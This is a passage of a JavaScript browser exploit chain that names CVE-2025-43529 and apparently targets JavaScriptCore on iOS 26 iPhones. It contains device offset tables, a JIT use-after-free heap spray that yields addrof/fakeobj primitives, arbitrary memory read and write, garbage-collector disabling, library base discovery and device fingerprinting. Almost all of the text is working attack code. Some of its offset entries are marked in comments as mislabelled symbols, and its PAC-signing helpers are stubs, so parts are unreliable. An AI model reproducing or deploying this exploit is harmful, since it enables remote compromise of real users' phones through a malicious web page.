      libsystem_kernel__thread_terminate : 0x23268ad90n,
      libsystem_c__atexit_mutex : 0x1ec49bef8n,
      libdyld__gAPIs : 0x1ec154040n,
      // ---- 结构偏移 (设备/构建无关, 复用 26A1) ----
      CAPointer : 0x20n,
      CGContextDelegate : 0x28n,
      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap : 0xf0n,
      IOSurfaceContextDelegate : 0x120n,
      IOSurfaceDrawable : 0x150n,
      IOSurfaceQueue : 0x48n,
      m_backend : 0x70n,
      m_drawingArea : 0x50n,
      m_gpuProcessConnection : 0x158n,
      m_gpuProcessConnection_m_identifier : 0x38n,
      m_imageBuffer : 0x18n,
      m_isRenderingSuspended : 0xe8n,
      m_platformContext : 0x38n,
      m_remoteDisplayLists : 0x70n,
      m_remoteRenderingBackendMap : 0xe8n,
      m_webProcessConnections : 0x80n,
      privateState_off : 0x7e8n,
      RemoteRenderingBackendProxy_off : 0x830n,
      rxBufferMtl_off : 0x100n,
      rxMtlBuffer_off : 0x70n,
      UI_m_connection : 0x28n,
      vertexAttribVector_off : 0x2548n,
      float64array_vector_offset : 0x20n,
      arraybuffer_data_offset : 0x10n,
      pthread_create_auth_stub : 0x17b4830n,
      pthread_create_offset : 0x7988n,
      dyld_cache_slide_info : 0x1a9000000n,
      dyld_shared_cache_base : 0x1a8000000n,
      // ---- [验证补齐] 关键缺失字段 ----
      jsc_base : 0x198ce6000n,  // 23F77 JavaScriptCore __TEXT 基址 (otool 核实, 26A1是0x19a1fe000)
      // ---- 揭穿的假名数据符号 → 真实符号 (23F77, a2s + .symbols 核实) ----
      JavaScriptCore__jitAllowList : 0x1ecb6b1a0n,       // 实为 _OBJC_METACLASS_$_AVAudioUnit
      JavaScriptCore__jitAllowList_once : 0x1ecb72320n,  // 实为 _OBJC_METACLASS_$_AVMIDIPlayer
      WebCore__DedicatedWorkerGlobalScope_vtable : 0x1f21d0988n, // 实为 CI::InstanceCounted vtable
      WebCore__initPKContact_once : 0x1ec825678n,        // 实为 ChatKit TapbackPickerBalloonView
      WebCore__initPKContact_value : 0x1800d99c0n,       // 实为 __objc_empty_cache
      mach_task_self_ptr : 0x1f30b6290n,                 // 实为 SiriOntology CodeGenGlobalArgs
      runLoopHolder_tid : 0x1800d99c0n,                  // 实为 __objc_empty_cache
      GetCurrentThreadTLSIndex_CurrentThreadIndex : 0x1800d99c0n, // 实为 __objc_empty_cache
      HOMEUI_cstring : 0x1833c4d4cn,                     // 实为 CTServerConnection...ClearSecondaryIccids
      PerfPowerServicesReader_cstring : 0x2644b5ddcn,     // 实为 mlx::core::scatter (Morpheus)
      Security__SecKeychainBackupSyncable_block_invoke : 0x18c013c64n, // 实为 MobileSafari SFCapsuleCollectionView
      libdyld__dlopen : 0x2605f71b0n,                    // 实为 mlir::memref::LoadOp::build (MLIR_ML)
      libdyld__dlsym : 0x263e8dbf8n,                     // 实为 -[SUUISettingsGroupDescription isEmpty]
      dyld4__dlopen_from_lambda_ret : 0x1ab59cc40n,       // 实为 ASR jsonData
      dyld4__RuntimeState_emptySlot : 0x1ab5e6080n,       // 实为 CLP dictionaryRepresentation
      dyld4__signPointer : 0x180148774n,                 // 实为 SiriInstrumentation CAARSchema...ReadFrom
      // ---- 仍未解析 (数据区无符号名, 非关键): JSC_config_flag/emptyString/free_slabs/
      //      mainRunLoop/HTMLDocument_vtable/TelephoneNumber_value/softLinkDDDFACache/
      //      WebProcess_singleton/RemoteGraphicsContextGLWorkQueue/DesktopServicesPriv_bss/
      //      libARI_cstring/libGPUCompilerImplLazy_cstring/invoker/cfstr_SystemLibraryTextToSpeech/
      //      dyld4__RuntimeState_vtable/allImagesArray/pthread_create_jsc/libsystem_pthread_base ----
   },
};

// [补齐] 合并目标机 iPhone17,2 (A18 Pro) iOS 26.5 23F77 偏移表到主表
//        (8 gadget + 41 符号 + 26 结构偏移, 已反汇编/nm 核实)
Object.assign(rce_offsets, rce_offsets_23F77);

async function _aarw_main_26() {

    const util = (() => {

        let BASE = 0x100000000;
        let scratch = new ArrayBuffer(0x10);
        let u32_scratch = new Uint32Array(scratch);
        let f64_scratch = new Float64Array(scratch);
        let u64_scratch = new BigUint64Array(scratch);
        let conv_offset = 0;

        function set64(offset, lo, hi = null) {
            u32_scratch[offset / 4] = lo;
            u32_scratch[offset / 4 + 1] = hi !== null ? hi : lo / BASE;
        }

        function _i2f(lo, hi = null) {
            set64(conv_offset, lo, hi);
            return f64_scratch[conv_offset / 8];
        }

        function _i64_2f(x) {
            u64_scratch[conv_offset / 8] = x;
            return f64_scratch[conv_offset / 8];
        }

        function _f2i(x) {
            f64_scratch[conv_offset / 8] = x;
            return u32_scratch[conv_offset/4]  + BASE * u32_scratch[conv_offset / 4 + 1];
        }

        function _f2i64(x) {
            f64_scratch[conv_offset / 8] = x;
            return u64_scratch[conv_offset / 8];
        }

        function _hex(x) {
            return '0x' + x.toString(16);
        }

        const PAC_MASK = (1n << 39n) - 1n;
        function _untag(x) {
            return Number(BigInt(x) & PAC_MASK);
        };

        function _dgc(n = 10000) {
            let ary = [];
            for (let i = 0; i < n; ++i) {
                ary.push(new Uint8Array(10000));
            }
        }

        function _pac_strip(val) {
            return BigInt(val) & 0x7fffffffffffn;
        }

        function _pac_sign_ia(val, ctx) {
            return val;
        }

        function _pac_sign_da(val, ctx) {
            return val;
        }

        return {_i2f, _i64_2f, _f2i, _f2i64, _hex, _untag, _dgc, _pac_strip, _pac_sign_ia, _pac_sign_da};

    })();

    const {_untag: untag} = util;
    const {_make_rw_26} = (() => {

        const {_f2i, _i2f, _dgc} = (() => {

            let BASE = 0x100000000;
            let scratch = new ArrayBuffer(0x10);
            let u32_scratch = new Uint32Array(scratch);
            let f64_scratch = new Float64Array(scratch);
            let u64_scratch = new BigUint64Array(scratch);
            let conv_offset = 0;

            function set64(offset, lo, hi = null) {
                u32_scratch[offset / 4] = lo;
                u32_scratch[offset / 4 + 1] = hi !== null ? hi : lo / BASE;
            }

            function _i2f(lo, hi = null) {
                set64(conv_offset, lo, hi);
                return f64_scratch[conv_offset / 8];
            }

            function _i64_2f(x) {
                u64_scratch[conv_offset / 8] = x;
                return f64_scratch[conv_offset / 8];
            }

            function _f2i(x) {
                f64_scratch[conv_offset / 8] = x;
                return u32_scratch[conv_offset/4]  + BASE * u32_scratch[conv_offset / 4 + 1];
            }

            function _f2i64(x) {
                f64_scratch[conv_offset / 8] = x;
                return u64_scratch[conv_offset / 8];
            }

            function _hex(x) {
                return '0x' + x.toString(16);
            }

            const PAC_MASK = (1n << 39n) - 1n;
            function _untag(x) {
                return Number(BigInt(x) & PAC_MASK);
            };

            function _dgc(n = 10000) {
                let ary = [];
                for (let i = 0; i < n; ++i) {
                    ary.push(new Uint8Array(10000));
                }
            }

            return {_i2f, _i64_2f, _f2i, _f2i64, _hex, _untag, _dgc};

        })()

        async function _make_rw_26(p_rce, mk_stage1, verify = false) {
            for (let i = 0; i < 20000; ++i) {
                _f2i(i);
                _i2f(i);
            }

            function getarg() {
                return arguments;
            }

            function get_oob(a,n) {
                return a[1][n];
            }

            for (let i = 0; i < 300000; i++) {
                let invkr = [i,getarg(i,2,3,4)];
                get_oob(invkr, 0);
            }

            let arrs = new Array(4000);
            for (let i = 0; i < 4000; ++i) {
                let obj = {
                    a: i,
                    b: 0,
                    c: 0,
                    d: 0,
                    e: 0,
                    f: 0,
                };
                arrs[i] = obj;
            }

            mk_stage1();
            if (verify) _dgc(10000);
        }
        return {_make_rw_26};

    })();

    class TryAgainError extends Error {}

    const {_make_stage1_26} = (() => {

        let treetab = new Uint32Array([0x26258,0x12084,0xa8080,0x22488,0x49058,0x410a1,0x15099,0x9a614,0x84160,0x95095,0x44664,0x5a506,0x50889,0x4a488,0x60694,0xaa465,0x52481,0x69465,0x56491,0x6685a,0x12699,0xa29a8,0xa5620,0x181a4,0x91124,0xa6166,0x20a2,0x8a056,0x15140,0x98502,0x1a149,0x952aa,0x20a08,0x6206,0x12126,0x50409,0x46810,0xa2204,0xa499a,0x1122a,0x96295,0xa1188,0x1415,0x69a6a,0x25411,0x6591,0x60861,0x52246,0xa1088,0x45554,0x2889a,0x21895,0x8605,0x5892a,0x12060,0xa8665,0x94959,0x62090,0x91416,0x24929,0xa4495,0x10a98,0x92628,0x416,0x41816,0x5a86a,0x69026,0x58966,0x15895,0x580a2,0xa8140,0x404a5,0x15548,0x9a28,0x8aa51,0x92619,0xa2250,0x82404,0xa295a,0x84185,0xa5816,0x51469,0x82a91,0x48226,0x266a0,0x550a1,0x82410,0x516a5,0x11598,0x51266,0x8a408,0x15219,0x86a25,0x62606,0x6556,0x11892,0x14696,0x8a49a,0x904,0x5955a,0x10892,0x9682,0x8424a,0x54222,0x44a89,0x9626,0x82596,0x59594,0x91962,0x25969,0x61924,0x20180,0xa44aa,0x1a996,0x81421,0xa4601,0xa0261,0x92140,0x8810a,0x10641,0x49660,0x22901,0x2a600,0x5a140,0x44a20,0xa6199,0xa1a6,0x5a9a9,0x85028,0x12168,0x5811a,0x65928,0xaa485,0x12451,0x6145a,0x59126,0x89602,0x49448,0x59090,0x60598,0x5a802,0x6aa14,0xa42a0,0x89466,0x206a2,0x92650,0xa1a8a,0xa21,0x58244,0x49698,0x52564,0x6246a,0xa5451,0x8420,0xa8509,0x81a45,0x8654,0x18a91,0x95654,0x48104,0x820,0x28a09,0x89950,0xa2202,0x5658a,0x89092,0x6899,0x95a61,0xa05a5,0x4191a,0x1a562,0x45658,0x9a526,0x28a18,0x8956,0x91546,0xa26aa,0x85892,0x54292,0xa8581,0x51189,0x14445,0xa08a0,0xa8a60,0x29118,0x62025,0xa205a,0x54812,0x2214,0x64694,0x28682,0x14268,0x96054,0x46598,0x5020a,0x68115,0x82882,0x698a6,0x11191,0x2a461,0x92442,0x21a84,0x6054a,0x10442,0x9464a,0x49592,0x8102a,0x168a,0x6466,0x2a6a1,0x91619,0x189a2,0x19010,0x41510,0x85290,0x69810,0x9a065,0x981a0,0x29960,0x88152,0x29164,0xa65a9,0x59a42,0x69585,0xa994,0x29a92,0xaa058,0x2059a,0x21541,0x54a14,0x85415,0x96084,0x56551,0x99856,0xaa96a,0x81526,0xa6a24,0x96880,0x9214a,0x1699,0x2811,0x66862,0x6226a,0x58150,0x5181a,0x94a6,0x9a684,0xa1868,0xa90,0x21868,0x804a2,0xa1661,0x8885a,0x65182,0x58290,0x68421,0xa462,0x1aa9a,0xa6499,0xa605a,0x8640,0x260a0,0x120a0,0x54492,0x26a05,0x68a09,0x2aa42,0x45806,0x14980,0x94980,0x6589a,0x869a,0x64902,0xa254a,0x14121,0x92aa0,0xa2919,0x64a86,0x269a,0xa4546,0x51462,0x9891,0x21116,0x42029,0x6aa8a,0x409a,0xa151a,0x42a55,0xa6250,0x59910,0x9412a,0x50424,0x26419,0x8291a,0x5a264,0x84612,0x21521,0x99855,0xa8191,0x82828,0x995a4,0xa1124,0xa4491,0x19921,0x595aa,0x9a429,0x196a,0xa2142,0x99a80,0x58409,0xa8661,0x5982,0x68a48,0x41821,0x54126,0x52262,0x90841,0xaa142,0x10564,0x4a658,0x49512,0x8490,0x41808,0x2a685,0x68589,0x51825,0x91484,0x1a096,0x12684,0x24252,0x48661,0x6640,0xa144a,0x49269,0x4a5a,0x184a2,0x64840,0xa1a81,0x2a814,0x16190,0x89046,0x2009a,0x829a,0x58282,0x90229,0x51646,0x949a8,0x44985,0x22540,0x44446,0xa848a,0x10966,0x22496,0x68922,0x90860,0x26486,0x442aa,0x28506,0xaa912,0xa005,0x52105,0x98822,0xa4a88,0x8240,0x44250,0x49252,0x42a91,0x21599,0x65216,0x56609,0x2a240,0x14629,0xa5616,0xaa6,0x26550,0x5a285,0x126a9,0x14909,0x18618,0x28159,0x49410,0x11a24,0x12544,0x10466,0x80191,0x28551,0x5191a,0x90865,0x62649,0xa4658,0x58614,0x82022,0x12122,0x266a,0x9809a,0x98662,0x6482a,0x42a95,0x49496,0x91a10,0xaa459,0x14554,0x816a2,0x84a81,0x80a55,0x85452,0x416aa,0x8908a,0x65006,0x581aa,0x8458a,0x2aa0,0x60aa,0x52548,0x61982,0x99844,0x4129,0x29aa9,0xa10a6,0x9958a,0x49091,0xa580,0x19984,0x68544,0x98564,0x40689,0x14a,0x10920,0x56218,0x92694,0x50426,0x19881,0x12a46,0x8089a,0x5a948,0x22408,0x60425,0x98016,0x2628,0xa5180,0x5568a,0x52984,0xa18a8,0x21210,0x6855a,0x26859,0x65092,0x46a05,0x24809,0x2aa55,0xa04a6,0x55104,0x9a8aa,0x94065,0xa916a,0x4a929,0x19a90,0x24458,0x92196,0x84609,0x10a2,0x548a1,0xa9125,0x66160,0x2908,0x6925a,0x54129,0x4649,0x692a0,0x10419,0x98484,0x21692,0x99a14,0x2a166,0x5210a,0x64140,0x550a4,0x86664,0x9111,0x5254,0x80556,0x52644,0x64866,0xa948a,0x9024a,0x6850a,0x10141,0xa1808,0x86290,0x28900,0x10525,0x20159,0x85299,0x4a48a,0x58211,0x14642,0x10a11,0xa8164,0x2159,0x4a052,0x49528,0x2955,0x120a2,0x24084,0x69089,0x8115,0xa9a24,0xa8949,0xaa420,0x8a946,0x4a419,0x16526,0x5025,0xaa861,0xa5122,0x45869,0xa5284,0x92960,0x92001,0x54185,0xa6948,0x12186,0x25011,0xa9925,0x9942,0x84452,0xa26aa,0x55002,0x8aa42,0x40445,0x12551,0xaa856,0x425a0,0x1010a,0x54521,0x12291,0x8088a,0x50204,0x6aa52,0x15826,0x96501,0x80aa6,0x85a59,0xaa512,0x2a585,0xa9045,0x29924,0x86a81,0x81581,0x55090,0x48889,0xa2529,0x99525,0x89852,0x591aa,0x22a19,0x81864,0x68629,0x1aa98,0x91640,0x1840,0x58660,0xa8918,0x6925a,0x92654,0x5284a,0x9990,0x48524,0x51aa5,0x96948,0x52051,0x6458,0x26662,0x214a5,0x28809,0x4201a,0xa8258,0x6a256,0x1450,0x56a08,0xaa858,0x51a66,0x562a2,0x22592,0x4a010,0x554a5,0x90444,0x4809a,0x12a26,0x41aa9,0x51161,0x66a68,0x82984,0x1aa2,0x91aa8,0x46898,0x16066,0x25aa,0x116a,0x595a1,0x45454,0x25502,0x44946,0x99000,0x40928,0x9410a,0x4a821,0x5a29,0x6aa28,0x9059a,0x18a20,0x29aa8,0xa26a2,0x25082,0x81265,0x21544,0x29aa,0x96019,0x2501a,0x82981,0x28519,0x92490,0x69994,0x12445,0xa54a1,0x4a260,0x59060,0xaa20,0x68aaa,0x96591,0x94a25,0x69421,0x50158,0x86501,0x88441,0x96250,0x88aa,0x89565,0x55a6a,0x94044,0xa1a00,0x81082,0x92858,0x8a514,0x140,0x40181,0xa8580,0x98400,0x89951,0x18a01,0x6991,0x515a1,0x1a924,0x18485,0x5116,0x64565,0x4608a,0x8460a,0xa5629,0x81655,0x5514a,0x21a4,0x11191,0x1801,0x19129,0x50282,0x60155,0x160aa,0x9aa12,0x2961a,0x48108,0xa119a,0x55944,0x50004,0x9a0a8,0x29022,0xa55a4,0x29526,0x59818,0x95815,0x4a1a4,0x22598,0x1aa91,0x91252,0x6090a,0x46a65,0x109a4,0x95908,0x80421,0x66926,0x9056a,0x2149a,0x59aa,0x56659,0xa1181,0x95084,0x8244a,0x69551,0x42295,0x46418,0x26898,0x56242,0x8569,0x65956,0x9242a,0x60509,0xa0849,0x5a208,0x51564,0x91591,0x545a1,0x21826,0x1141,0x60a80,0x42819,0x95541,0x29542,0x4a469,0x85668,0xa2518,0x2144a,0x56991,0x2958,0x68141,0x566a6,0x96886,0x5a162,0x28014,0xa6a1,0x68945,0x52291,0x82215,0xa612,0x4aaa4,0x2a41,0x62286,0xa65a9,0x254a1,0x4089,0xa1425,0x40699,0x52294,0x1a581,0xa1a02,0x26199,0x41066,0x50822,0xa60a4,0x91181,0x682a9,0x1a94a,0x29448,0x922a5,0x21a09,0x912a5,0x10681,0xa0aa9,0x9062a,0x91409,0x4a005,0x580a8,0xa661,0x90404,0x41242,0x5226,0x85501,0xa6461,0xa56a1,0x81a10,0x81828,0x88251,0x962a4,0x61946,0x2984,0xa5152,0x91044,0x548a9,0x94556,0x44564,0x16424,0x24090,0x5521a,0x59549,0x510a8,0x241a4,0x4a54,0x6a6a2,0x489a0,0x82aa1,0x20919,0x8a5aa,0x48565,0x28485,0x51a26,0x95095,0x2102a,0x2a286,0x44418,0xa8894,0xaa542,0x15159,0x46964,0x59685,0x6a298,0x1252a,0x60a20,0x81491,0x99562,0x64616,0x60562,0x6010,0x6692a,0x1a2a9,0x44180,0x98198,0x60888,0x52916,0x6a658,0x26628,0x1a090,0x86554,0x2a12a,0x48548,0x58641,0x82594,0x9881a,0x9621a,0x4622a,0x568a,0xa9a5a,0x8919,0x1a621,0x818a5,0x5094a,0x9244,0x64486,0x84554,0x11046,0x5556,0x45aa4,0xa4929,0x24995,0x18280,0x56166,0x91286,0xa2988,0x58065,0x15050,0xa1988,0x11059,0x69186,0x89688,0x62411,0x56a18,0x8101,0x24909,0x11820,0x4a004,0xaa286,0x9590,0x95422,0x4490,0x96995,0x8858,0x19aa0,0x2a106,0x4a198,0x58a54,0x88956,0x4258a,0x46581,0x82108,0x8a580,0x1a412,0x50a02,0x54096,0xa6564,0x618a8,0x6a2a4,0x49928,0x2a440,0x28940,0xa2541,0x5a259,0x90184,0x24001,0x60500,0x58609,0x59054,0x25625,0x56949,0x90196,0x80059,0x1a094,0x42a69,0x48660,0x41a84,0x585a8,0x65054,0x2904a,0x88a15,0x51618,0x56506,0x86a9,0x2429,0xa6158,0x50816,0x4000a,0x416a6,0x286a6,0x51062,0xa0900,0x16844,0x59552,0x509aa,0x62998,0x11594,0x186a2,0x2a646,0x5866,0x4255a,0xa6622,0x61986,0x91544,0x91909,0x94441,0x9a119,0xa10aa,0x41215,0x5a125,0xa224,0x19416,0x400a,0x96990,0x80244,0x6a5aa,0xa5895,0x14564,0x8a504,0x2a44a,0x6a850,0x528a,0x64568,0x81921,0x11162,0x41249,0x18a44,0x80954,0x61501,0x48551,0x8aa09,0x48590,0x18566,0xa0882,0x5a144,0x98912,0x40404,0x65000,0xa058a,0x8459,0x106a9,0x22a01,0x94202,0x50062,0x55a88,0x890aa,0x56a11,0x65a84,0x90298,0x9a19,0x50984,0x20952,0xa5a20,0x98924,0x55698,0x9a642,0x69520,0x44114,0x888a1,0x10642,0x15516,0x21244,0x66806,0x159a4,0x12a44,0x60251,0x25959,0x6458,0x1a568,0xa1196,0x60498,0x46298,0x40482,0xa1905,0x85a95,0x46252,0x24942,0x5a26a,0x2188,0x189a1,0x6461a,0x80510,0x10a60,0x42419,0x4a568,0x16559,0x28902,0x1a119,0x88004,0x12025,0x92121,0xa410,0x15862,0x6859a,0x88999,0x8251,0x842a0,0xa1a54,0x12959,0x92019,0x46980,0x14658,0x196a9,0x11802]);

        let grbase = 30;

        function exp_26() {
            let shallow_flat = new Array(new Array(false,false), new Array(false,false));
            function opt(flat) {
                let oj = {a: 0,b: 0, 0: 13.37};
                let _a = {a: 0};
                let a = flat ? _a : 14.47;
                for (let i=0; i < flat.length; i++) {
                    flat[i][2] = a;
                }
                _a.a = oj;
                oj = 0;
                return _a;
            };

            function prepare() {
                for (let i=0; i<50000; i++) {
                    shallow_flat[0][0] = i;
                    shallow_flat[1][0] = i;
                    opt(shallow_flat);
                }
            }

            function build_tree(depth,isz) {
                if (!depth) {
                    return {a:0};
                }
                let leaf = new Array(3);
                for (let i=0; i<3; i++) {
                    leaf[i] = build_tree(depth-1, (i==0) && isz);
                }
                return leaf;
            }

            function flatten_tree(tree) {
                let flattree = new Array(treetab.length);
                for (let k in treetab) {
                    let path = treetab[k];
                    let node = tree;
                    for (let i=0; i < 11; i++) {
                        node = node[(path >> (i*2)) & 0x3];
                    }
                    flattree[k] = node;
                }
                tree[0][0][0][0][0][0][0][0][0][0][0][0][0] = flattree;
            }

            let rpl = new Array(4096);
            let rpl2 = new Array(4096);

            function wipe_tree(tree) {
                if (tree.a !== undefined) return;
                if(!tree) return;
                for (let i=2; i>=0; i--) {
                    let v = tree[i];
                    tree[i] = 0;
                    wipe_tree(v);
                }
            }

            prepare();

            function _gr(a) {
                return new Uint8Array(2<<(grbase+a));
                for (let i of []) {}
            }

            function gr(a) {
                _gr(a);
            }

            let pair = {contig: false, double: false};

            let iit = 512;
            let rootblock = new Array(iit);
            let rootblock1 = new Array(iit);
            let uaf = new Array(0);
            function pwn(util, p) {
                let did_find = false;
                let tree = build_tree(12,3);
                flatten_tree(tree);
                for (let i = 0; i < 32; i++) {
                    rpl[i] = new Array(14.47,14.47,14.47,i);
                }
                gr(5);
                
                let flattree = tree[0][0][0][0][0][0][0][0][0][0][0][0][0];

                for (let i = 0; i < iit; i++) {
                    uaf[i] = opt(flattree);
                }
                flattree.length = 0;
                wipe_tree(tree);
                gr(5);
                gr(5);
                for (let i = 0; i < iit*3; i++) {
                    rpl2[i] = new Array(14.47,14.47,14.47,i);
                }
                for (let i = 0; i < iit; i++) {
                    uaf[i] = uaf[i].a;
                }
                gr(5);
                for (let i = 0; i < iit; i++) {
                    rpl[i] = {a:4242,b:i};
                }
                let found = false;
                for (let i = 0; i < iit; i++) {
                    if (!found && uaf[i][0] == 14.47) {
                        uaf[i][0] = 15.57;
                        for (let j=0; j<rpl2.length; j++) {
                            if (rpl2[j] && rpl2[j][0] == 15.57) {
                                rpl2[j][0] = new Array(0);
                                pair.contig = rpl2[j];
                                pair.double = uaf[i];
                                rpl2.fill(0);
                                uaf.fill(0);
                                gr(6);
                                gr(6);
                                let _f64 = new Float64Array(1);
                                let _u32 = new Uint32Array(_f64.buffer);
                                p_rce.addrof = function(o) {
                                    pair.contig[0] = o;
                                    let rv = pair.double[0];
                                    pair.double[0] = 13.37;
                                    return rv;
                                };
                                p_rce.fakeobj = function(o) {
                                    pair.double[0] = o;
                                    let rv = pair.contig[0];
                                    pair.double[0] = 13.37;
                                    return rv;
                                };
                                p_rce.addrof52 = (o) => util._f2i(p_rce.addrof(o));
                                p_rce.fakeobj52 = (a) => p_rce.fakeobj(util._i2f(a));
                                return;
                            }
                        }
                    }
                    uaf[i][0] = 0;
                }
                rpl.fill(0);
                rpl2.fill(0);
                gr(5);
                throw new Error("failed exp");
            };
            return pwn;
        }

        function _make_stage1_26(util, p_rce) {
            let run = exp_26();
            
            const N = 150;
            for (let i = 0; i < N; ++i) {
                try {
                    run(util, p_rce);
                    print(`success with ${i+1} unit tries (iOS 26 CVE-2025-43529)`);
                    return;
                } catch (e) {
                }
            }
            throw new TryAgainError();
        }

        return {_make_stage1_26};

    })();

    print("try aar/w (iOS 26 CVE-2025-43529-26)");
    try {
        await _make_rw_26(p_rce, () => _make_stage1_26(util, p_rce));
        function setup_stage1_prim_26(p_rce)
        {
          print("inside stage1_prim (iOS 26)");
          function addrof(object) {
              return BigInt.fromDouble((p_rce.addrof(object)));
          }
          function fakeobj(addr) {
              return p_rce.fakeobj(addr.asDouble());
          }
          let junk0 = new Array(4).fill(1.1);
          junk0[0] = 1.1;
          junk0[1] = 1.1;
          let scribble_element = new Array(4).fill(1.1);
          scribble_element[0] = 1.1;
          scribble_element[1] = 1.1;
          let results = new Array(2).fill(1.1);
          results[0] = 1.1;
          results[1] = 1.1;
          let change_scribble_holder = { p1: fakeobj(0x0108240700006000n), p2: scribble_element };
          let change_scribble = fakeobj(addrof(change_scribble_holder) + 0x10n);
          for (let i = 0; i < 2; i++) {
              let a = i == 0 ? change_scribble : junk0;
              results[i] = a[0];
          }
          change_scribble_holder.p1 = results[0];

          scribble_element.p3 = 1.1;
          scribble_element[0] = 1.1;

          let double_array_cell = BigInt.fromDouble(change_scribble[0]);
          change_scribble_holder.p1 = fakeobj(double_array_cell);
          const original_cell = change_scribble[0];

          function write64(addr, value) {
              change_scribble[0] = original_cell;
              change_scribble[1] = (addr + 0x10n).asDouble();

              if (value === 0n) {
                  scribble_element.p3 = 1;
                  delete scribble_element.p3;
              } else if (value < 0x2000000000000n) {
                  scribble_element.p3 = fakeobj(value);
              } else if (value <= 0x7ff2000000000000n || value >= 0x8002000000000000n && value <= 0xfff0000000000000n) {
                  scribble_element.p3 = value.sub(0x2000000000000n).asDouble();
              } else {
                  let off_addr = addr.add(8n);
                  let off_val = read64(off_addr);
                  let [hi, lo] = value.asInt32s();

                  scribble_element.p3 = hi;
                  change_scribble[1] = (addr + 0x14n).asDouble();
                  scribble_element.p3 = lo;

                  write64(off_addr, off_val);
              }
          }

          let read64_biguint64arr_local = new BigUint64Array(4);
          change_scribble[1] = addrof(read64_biguint64arr_local).add(8n).asDouble();
          let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
          read64_biguint64arr_local[0] = 0x10000000006n;
          read64_biguint64arr_local[1] = read64_float64arr_bytes.add(0x10n);
          let read64_str_local = '\u4444'.repeat(0x10);
          [][read64_str_local];
          change_scribble[1] = addrof(read64_str_local).add(8n).asDouble();
          scribble_element[0] = read64_float64arr_bytes.asDouble();

          function read64(addr) {
              read64_biguint64arr_local[1] = addr;
              return (BigInt(read64_str_local.charCodeAt(0))
                  | BigInt(read64_str_local.charCodeAt(1)) << 16n
                  | BigInt(read64_str_local.charCodeAt(2)) << 32n
                  | BigInt(read64_str_local.charCodeAt(3)) << 48n);
          }

          function read32(addr) {
              read64_biguint64arr_local[1] = addr;

              return (BigInt(read64_str_local.charCodeAt(0))
                  | BigInt(read64_str_local.charCodeAt(1)) << 16n);
          }
          print("after setting up prims (iOS 26)");
          const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
          const heap = vm.add(0xc0n);
          const isSafeToCollect = heap.add(0x241n);
          function write8(ptr, u16) {
            let value = read64(ptr);
            value &= ~0xffn;
            value |= u16;
            write64(ptr, value);
          };
          write8(isSafeToCollect, 0n);
          print("after gc disable (iOS 26)");
          
          const executable = read64(addrof(parseFloat) + 0x18n);
          globalFuncParseFloat = read64(executable + 0x28n).noPAC();
          const jsc_base = (function() {
              let jsc_base = globalFuncParseFloat & ~0xfffn;

              while (1) {
                  read64_biguint64arr_local[1] = jsc_base;
                  if (read64_str_local.charCodeAt(0) == 0xfacf && read64_str_local.charCodeAt(1) == 0xfeed) {
                      return jsc_base;
                  }
                  jsc_base -= 0x1000n;
              }
          })();
          print("jsc_base now: " + jsc_base.hex());
          
          function parse_adrp(addr) {
              const x = Number(read32(addr));
              const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
              const immlo = x >> 29 & 3;
              const imm = immhi << 14 | immlo << 12;
              return imm + Math.floor(Number(addr) / 0x1000) * 0x1000;
          }
          function parse_add(addr) {
              const insn = Number(read32(addr));
              const off = insn >> 10 & (1 << 12) - 1;
              return off;
          }
          function parse_adrp_add(addr, is_ldrb = false) {
              let res = parse_adrp(addr);
              let add = parse_add(addr + 4n);
              return res + add;
          }
          
          const versions_26 = ['26A1', '26A2', '26B1'];
           const pthread_create_auth_stubs_offset_26 = {
             '26,0': 0x17b4830n,
             '26,0,1': 0x17b4830n,
             '26,1': 0x17c5a40n,
             '26,1,1': 0x17c5a40n,
             '26,2': 0x17d6b50n,
             // [补齐] 23F77 (26.5) 目标机 — auth stub 偏移 (需运行时 JSC 实测, 暂沿用 26.0)
             '26,5': 0x17b4830n,
           };
           const pthread_create_offset_26 = {
             '26,0': 0x7988n,
             '26,0,1': 0x7988n,
             '26,1': 0x7a99n,
             '26,1,1': 0x7a99n,
             '26,2': 0x7baan,
             // [补齐] 23F77 (26.5) 目标机 — _pthread_create(0x1e26dbeb4) - __TEXT(0x1e26d8000) = 0x3eb4
             '26,5': 0x3eb4n,
           };
          const linkedit_to_device_26 = {
            '26,0': {
                [0x271ffc000n]: "iPhone15,2_26A1",
                [0x2710fc000n]: "iPhone15,3_26A1",
            },
          };
          
          function detect_ios26_device() {
              print("detecting iOS 26 device...");
              const pthread_create_jsc_addr = jsc_base + 0x17a4830n;
              const signed_pthread_create = read64(pthread_create_jsc_addr);
              const unsigned_pthread_create = signed_pthread_create.noPAC();
              print("unsigned_pthread_create: " + unsigned_pthread_create.hex());
              
              let found_offsets = null;
              for (const [key, val] of Object.entries(rce_offsets)) {
                  if (val.jsc_base && (val.jsc_base & ~0xfffn) == (jsc_base & ~0xfffn)) {
                      print("found matching profile: " + key);
                      found_offsets = val;
                      break;
                  }
              }
              
              if (!found_offsets) {
                  const default_key = Object.keys(rce_offsets)[0];
                  print("using default profile: " + default_key);
                  found_offsets = rce_offsets[default_key];
              }
              
              return found_offsets;
          }
          
          const detected_offsets = detect_ios26_device();
          offsets = detected_offsets;
          p.offsets = offsets;
          
          print("iOS 26 offsets loaded");
          
          function detect_slide_26() {
              if (!offsets.dyld_shared_cache_base) return 0n;
              try {
                  const slide_info_addr = offsets.dyld_cache_slide_info;
                  const magic = read64(slide_info_addr);
                  if ((magic & 0xFFFFFFFFn) === 5n) {
                      const slide_val = read64(slide_info_addr + 12n);
                      print(`dyld4 slide detected: ${slide_val.hex()}`);
                      return slide_val;
                  }
              } catch (e) {}
              return 0n;
          }
          
          slide = detect_slide_26();
          p.slide = slide;
          print("slide: " + slide.hex());
          
          p.addrof = addrof;
          p.fakeobj = fakeobj;
          p.read64 = read64;
          p.write64 = write64;
          p.read32 = read32;
          p.write8 = write8;
          p.jsc_base = jsc_base;
          
          const ios_version_26 = (function() {
          let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
              if (version) {
                  return version.split('_').map(part => parseInt(part));
              }
          })();
          print(`ios_version_26: ${ios_version_26}`);
          print(`ios_version: ${ios_version_26}`);

          const device_chipset_26 = {
            "iPhone15,2_26A1": "a8d12f7a9c3e4b5d8f1a2c3e4b5d6f7a",
            "iPhone15,3_26A1": "a8d12f7a9c3e4b5d8f1a2c3e4b5d6f7a",
